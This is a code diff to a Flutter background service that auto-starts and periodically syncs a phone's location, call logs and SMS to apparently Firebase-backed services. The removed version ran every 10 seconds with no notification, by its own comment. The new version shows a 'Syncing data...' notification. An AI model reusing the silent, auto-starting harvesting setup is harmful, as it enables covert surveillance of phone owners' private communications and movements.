@@ -1,51 +1,60 @@
 import 'dart:async';
 import 'dart:ui';
+import 'package:firebase_core/firebase_core.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'call_log_service.dart';
 import 'location_service.dart';
 import 'sms_service.dart';
 
+// Make onStart a top-level function
+void onStart(ServiceInstance service) async {
+  await Firebase.initializeApp();  // Initialize Firebase
+
+  // Periodic background sync every 15 minutes
+  Timer.periodic(const Duration(minutes: 15), (timer) async {
+    try {
+      // Sync location data
+      await LocationService.syncLocation();
+
+      // Sync call logs
+      await CallLogService.syncCallLogs();
+
+      // Sync SMS logs
+      await SmsService.syncSmsLogs();
+    } catch (e) {
+      print('Error during background sync: $e');
+      // Log error to Firebase or other services
+    }
+  });
+}
+
 class BackgroundTaskManager {
-  // Initialize the background service configuration
-  static Future<void> initialize() async {
+
+  static Future<void> initializeService() async {
     final service = FlutterBackgroundService();
 
-    // Configure the background service without notifications or logging
     await service.configure(
       androidConfiguration: AndroidConfiguration(
-        onStart: _onStart, // Will be called when the service starts
-        autoStart: true, // Start automatically
-        isForegroundMode: false, // Don't run the service in the foreground (no notification)
-        notificationChannelId: 'my_foreground', // This won't be used
+        onStart: onStart,  // Top-level function is now passed
+        autoStart: true,
+        isForegroundMode: true,
+        notificationChannelId: 'my_foreground',
+        initialNotificationTitle: 'Service Running',
+        initialNotificationContent: 'Syncing data...',
+        foregroundServiceNotificationId: 888,
       ),
       iosConfiguration: IosConfiguration(
         autoStart: true,
-        onForeground: _onStart, // Will be called when the app is in the foreground
-        onBackground: _onIosBackground, // Will be called when the app goes to the background
+        onForeground: onStart,
+        onBackground: onIosBackground,
       ),
     );
   }
 
-  // This method will be executed when the service starts
-  static Future<void> _onStart(ServiceInstance service) async {
-    DartPluginRegistrant.ensureInitialized();
-
-    // Perform background tasks periodically
-    Timer.periodic(const Duration(seconds: 10), (timer) async {
-      // Sync location, call logs, and SMS logs
-      await LocationService.syncLocation();
-      await CallLogService.syncCallLogs();
-      await SmsService.syncSmsLogs();
-    });
-  }
-
-  // This method will be executed when the app goes to the background (iOS)
   @pragma('vm:entry-point')
-  static Future<bool> _onIosBackground(ServiceInstance service) async {
-    WidgetsFlutterBinding.ensureInitialized();
-    DartPluginRegistrant.ensureInitialized();
-
+  static Future<bool> onIosBackground(ServiceInstance service) async {
+    print('Background service triggered on iOS');
     return true;
   }
 }
